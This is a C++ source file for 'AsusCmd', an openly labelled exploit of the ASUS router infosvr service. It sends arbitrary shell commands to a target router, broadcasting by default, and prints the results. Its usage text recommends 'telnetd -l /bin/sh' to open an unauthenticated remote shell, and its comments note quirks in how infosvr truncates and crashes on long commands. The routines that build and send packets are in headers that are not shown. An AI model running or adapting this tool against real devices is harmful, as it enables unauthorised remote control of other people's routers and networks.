// AsusCmd.cpp: определяет точку входа для консольного приложения.
//

#include "stdafx.h"
#pragma comment(lib, "ws2_32.lib")
#include "..\Common\includes\InfosvrDefines.h"
#include "..\Common\includes\InfosvrExploit.h"

int _tmain(int argc, _TCHAR* argv[])
{
	int timeout_msec = 500;
	ExecCmdFlags ecfVerbose = EC_FLAG_NOFLAG;
	ExecCmdFlags ecfResOnly = EC_FLAG_NOFLAG;
	char *cmd;
	char *targetIP = "255.255.255.255";	// if target not specified - broadcast

	if (argc <= 1)
	{
		printf_s("AsusCmd v1.3\n");
		printf_s("The ASUS Router infosvr exploit.\n");
		printf_s("Licensed under GPL (http://www.gnu.org/licenses/gpl.html)\n");
		printf_s("Copyright 2015 TishSerg, Ukraine\n\n");
		printf_s("Most useful command: telnetd -l /bin/sh [-p <PORT>]\n\n");
		printf_s("Response contains stdout only. To see stderr too add to end of command something like '2>&1|cat'. Example: 'rm LOL 2>&1|cat'\n\n");
		printf_s("Usage: AsusCmd <command> [<target_ip> [VERBOSE or RES_ONLY]]\n");
		//for (int i = 0; i < 256; i++)
		//{
		//	printf_s("%d\t->%c\n", i, i);
		//}
		return 0;
	}
	if (argc > 1)
	{
		int ans;
		cmd = argv[1];	// when cmd len > 238 - infosvr have segmentation fault (but executes command up to 256 chars)
		if (strlen(cmd) > SYSCMDBUF_MAX)
		{
			printf_s("Command size (%d chars) exceeds send buffer (%d bytes).\n", strlen(cmd), SYSCMDBUF_MAX);
			printf_s("Command will be truncated. Continue? ('y' - yes): ");
			ans = _getch();
			printf_s("%c\n", ans);
			if (ans != 'y' && ans != 'Y')
			{
				return 0;
			}
		}
		if (strlen(cmd) > MAXSYSCMD)
		{
			printf_s("Command size (%d chars) exceeds max command size (%d chars).\n", strlen(cmd), MAXSYSCMD);
			printf_s("Command will be truncated on router before executed. Continue? ('y' - yes): ");
			ans = _getch();
			printf_s("%c\n", ans);
			if (ans != 'y' && ans != 'Y')
			{
				return 0;
			}
		}
		if (strlen(cmd) == MAXSYSCMD)
		{
			printf_s("Command size %d chars have strange effect: router truncate it to 1 char.\n", strlen(cmd));
			printf_s("Try to shorten command. Send anyway? ('y' - yes): ");
			ans = _getch();
			printf_s("%c\n", ans);
			if (ans != 'y' && ans != 'Y')
			{
				return 0;
			}
		}
	}
	if (argc > 2)
	{
		targetIP = argv[2];
	}
	if (argc > 3)
	{
		for (int i = 3; i < argc; i++)
		{
			if (_stricmp(argv[i], "VERBOSE") == 0)
			{
				ecfVerbose = EC_FLAG_VERBOSE;
			}
			else if (_stricmp(argv[i], "RES_ONLY") == 0)
			{
				ecfResOnly = EC_FLAG_RESONLY;
			}
			else
			{
				printf_s("Unrecognized option: '%s'\tIt will be ignored.\n", argv[i]);
			}
		}
	}

	//***	Setup socket and addresses	***//
	SOCKET sock = NULL;
	SOCKADDR_IN localAddr, targetAddr;
	setupNetworking(targetIP, &sock, &localAddr, &targetAddr);

	//***	Send	***//
	execSysCmd(cmd, sock, &targetAddr, timeout_msec, ecfVerbose|ecfResOnly);
	
	//***	Exit program	***//
	if (closesocket(sock) == SOCKET_ERROR)
	{
		printf_s("Failed to close SOCKET.\tWSA error: %d\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	WSACleanup();
	return 0;
}

